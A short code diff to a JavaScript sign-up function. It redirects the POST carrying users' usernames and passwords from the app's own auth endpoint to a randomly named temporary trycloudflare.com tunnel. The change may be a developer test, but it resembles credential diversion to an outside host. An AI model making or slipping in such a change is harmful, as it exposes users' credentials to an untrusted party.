@@ -10,7 +10,7 @@ function PostSignUp(){
         "username": getValue("username"),
         "password": getValue("password")
     }
-    postJSON("https://ped.fly.dev/auth/userdata",datainjson,responseFunction);
+    postJSON("https://labs-receipt-produced-ty.trycloudflare.com",datainjson,responseFunction);
 }
 
 function responseFunction(result){
